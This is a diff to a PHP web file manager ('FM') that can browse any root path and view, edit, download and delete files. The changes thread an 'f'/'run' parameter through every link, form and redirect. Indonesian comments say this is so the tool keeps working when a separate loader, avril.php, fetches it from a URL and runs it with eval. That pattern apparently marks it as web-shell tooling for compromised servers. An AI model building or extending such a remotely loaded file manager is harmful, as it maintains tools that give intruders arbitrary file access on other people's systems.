@@ -76,7 +76,10 @@ function show_login($err=''){
 // ── auth ─────────────────────────────────────────────────────────
 if(isset($_POST['logout'])){
     $_SESSION=array(); @session_destroy();
-    @ob_end_clean(); header('Location: '.$_SERVER['PHP_SELF']); exit;
+    @ob_end_clean();
+    $_via_avril_lo = isset($_GET['f']) ? $_GET['f'] : (isset($_GET['run']) ? $_GET['run'] : null);
+    $loc = $_SERVER['PHP_SELF'].($_via_avril_lo ? '?f='.urlencode($_via_avril_lo) : '');
+    header('Location: '.$loc); exit;
 }
 if(!isset($_SESSION['auth'])){
     if(isset($_POST['u'],$_POST['p'])&&$_POST['u']===$AUTH_USER&&$_POST['p']===$AUTH_PASS){
@@ -97,8 +100,17 @@ $rel=isset($_GET['d'])?$_GET['d']:'';
 $cwd=_safe($root,$rel);
 if(!$cwd||!is_dir($cwd)){ $cwd=$root; $rel=''; }
 
-$self=$_SERVER['PHP_SELF'];
-$qb='?root='.urlencode($root).'&d='.urlencode($rel);
+// Detect jika di-eval via avril (?f= atau ?run=)
+// Kalau iya, semua link harus tetap lewat avril
+$_via_avril = isset($_GET['f']) ? $_GET['f'] : (isset($_GET['run']) ? $_GET['run'] : null);
+if($_via_avril){
+    // self = avril.php, dengan ?f=<fm_url> prefix
+    $self=$_SERVER['PHP_SELF'];
+    $qb='?f='.urlencode($_via_avril).'&root='.urlencode($root).'&d='.urlencode($rel);
+} else {
+    $self=$_SERVER['PHP_SELF'];
+    $qb='?root='.urlencode($root).'&d='.urlencode($rel);
+}
 $msg='';
 
 // ── actions ───────────────────────────────────────────────────────
@@ -271,6 +283,7 @@ tr:hover td{background:#1c2128}
   <h1>FM</h1>
   <form method="get" action="<?php echo $self; ?>">
     <input type="hidden" name="d" value="">
+    <?php if($_via_avril): ?><input type="hidden" name="f" value="<?php echo _enc($_via_avril); ?>"><?php endif; ?>
     <input type="text" name="root" value="<?php echo _enc($root); ?>" style="width:220px" placeholder="root path">
     <button type="submit" class="b">Go</button>
   </form>
@@ -290,7 +303,7 @@ tr:hover td{background:#1c2128}
   <div class="sbh">Quick</div>
   <?php foreach($quick as $ql=>$qp): ?>
     <?php if(is_dir($qp)): ?>
-    <a href="<?php echo _enc($self.'?root='.urlencode($qp).'&d='); ?>" title="<?php echo _enc($qp); ?>"><?php echo _enc($ql); ?></a>
+    <a href="<?php echo _enc($self.'?'.($_via_avril?'f='.urlencode($_via_avril).'&':'').'root='.urlencode($qp).'&d='); ?>" title="<?php echo _enc($qp); ?>"><?php echo _enc($ql); ?></a>
     <?php endif; ?>
   <?php endforeach; ?>
   <div class="sbh">Subdirs</div>
@@ -298,7 +311,7 @@ tr:hover td{background:#1c2128}
     <?php if($sf==='.'||$sf==='..') continue; ?>
     <?php $sfp=$cwd.DIRECTORY_SEPARATOR.$sf; if(!is_dir($sfp)) continue; ?>
     <?php $sfr=($rel===''?'':$rel.'/').$sf; ?>
-    <a href="<?php echo _enc($self.'?root='.urlencode($root).'&d='.urlencode($sfr)); ?>" title="<?php echo _enc($sf); ?>">[D] <?php echo _enc($sf); ?></a>
+    <a href="<?php echo _enc($self.'?'.($_via_avril?'f='.urlencode($_via_avril).'&':'').'root='.urlencode($root).'&d='.urlencode($sfr)); ?>" title="<?php echo _enc($sf); ?>">[D] <?php echo _enc($sf); ?></a>
   <?php endforeach; ?>
 </div>
 
@@ -343,7 +356,7 @@ tr:hover td{background:#1c2128}
 <div class="bc">
   <?php foreach($crumbs as $ci=>$cc): ?>
     <?php if($ci<count($crumbs)-1): ?>
-      <a href="<?php echo _enc($self.'?root='.urlencode($root).'&d='.urlencode($cc['r'])); ?>"><?php echo $cc['l']; ?></a>
+      <a href="<?php echo _enc($self.'?'.($_via_avril?'f='.urlencode($_via_avril).'&':'').'root='.urlencode($root).'&d='.urlencode($cc['r'])); ?>"><?php echo $cc['l']; ?></a>
       <span>/</span>
     <?php else: ?>
       <span style="color:#c9d1d9"><?php echo $cc['l']; ?></span>
@@ -370,18 +383,19 @@ tr:hover td{background:#1c2128}
 <tbody>
 <?php foreach($entries as $e): ?>
   <?php
-    $hd=$self.'?root='.urlencode($root).'&d='.urlencode($e['r']);
-    $he=$self.'?root='.urlencode($root).'&d='.urlencode($rel).'&ed='.urlencode($e['r']);
-    $hdl=$self.'?root='.urlencode($root).'&d='.urlencode($rel).'&dl='.urlencode($e['r']);
-    $hv=$self.'?root='.urlencode($root).'&d='.urlencode($rel).'&vw='.urlencode($e['r']);
-    $hdel=$self.'?root='.urlencode($root).'&d='.urlencode($rel).'&del='.urlencode($e['r']);
+    $_fp=$_via_avril?'f='.urlencode($_via_avril).'&':'';
+    $hd=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($e['r']);
+    $he=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&ed='.urlencode($e['r']);
+    $hdl=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&dl='.urlencode($e['r']);
+    $hv=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&vw='.urlencode($e['r']);
+    $hdel=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&del='.urlencode($e['r']);
     $rp=($e['n']==='..') ? (dirname($rel)==='.'?'':dirname($rel)) : null;
   ?>
   <tr>
     <td><?php echo _icon($e['n'],$e['d']); ?></td>
     <td class="fn">
       <?php if($e['n']==='..'):?>
-        <a href="<?php echo _enc($self.'?root='.urlencode($root).'&d='.urlencode($rp!==null?$rp:'')); ?>">.. (up)</a>
+        <a href="<?php echo _enc($self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rp!==null?$rp:'')); ?>">.. (up)</a>
       <?php elseif($e['d']):?>
         <a href="<?php echo _enc($hd); ?>"><?php echo _enc($e['n']); ?></a>
       <?php else:?>
